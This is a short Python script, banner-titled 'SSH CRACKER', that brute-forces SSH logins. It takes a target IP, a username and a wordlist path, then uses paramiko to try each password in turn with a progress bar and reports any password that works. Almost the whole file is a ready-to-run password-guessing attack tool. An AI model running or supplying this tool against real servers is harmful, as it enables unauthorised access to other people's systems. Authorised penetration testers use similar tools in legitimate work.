# error check for libraries
try:
    import paramiko
except ImportError:
    print(" ----ERROR paramiko not present try | pip install paramiko ----")
try:
    import tqdm
except ImportError:
    print(" ----ERROR tqdm not present try | pip install tqdm ----")

# importing libraries
import paramiko
from tqdm import tqdm

art = r""" $$$$$$\   $$$$$$\  $$\   $$\        $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\ $$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$ /  \__|$$ /  \__|$$ |  $$ |      $$ /  \__|$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
\$$$$$$\  \$$$$$$\  $$$$$$$$ |      $$ |      $$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\    $$$$$$$  |
 \____$$\  \____$$\ $$  __$$ |      $$ |      $$  __$$< $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$< 
$$\   $$ |$$\   $$ |$$ |  $$ |      $$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$ |  $$ |      \$$$$$$  |$$ |  $$ |$$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
 \______/  \______/ \__|  \__|       \______/ \__|  \__|\__|  \__| \______/ \__|  \__|\________|\__|  \__|


                                                                                                          """
print(f'\n \n{art}')
# setup basic inputs
target_ip = input("[+] Enter SSH server IP: ")
username = input("[+] Enter username: ")
password_file = input("[+] Enter password list path: ")
found = False

# load passwords into a list
try:
    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    # add a progress bar
    for password in tqdm(passwords, desc="Cracking SSH", unit="pwd"):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=target_ip, username=username, password=password, timeout=2)
            found = True
            print(f"\n[+] Success! Password found: {password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            client.close()
        except Exception:
            client.close()
except FileNotFoundError:
    print("\n [+] ERROR: The password file was not found. \n [+] Please check the file path/name")

# password not matched exception
if found:
    print(f"\n[+] Success! Password found: {password}")
else:
    print('\n [+] Password list is Exhausted \n [+] Try with new list')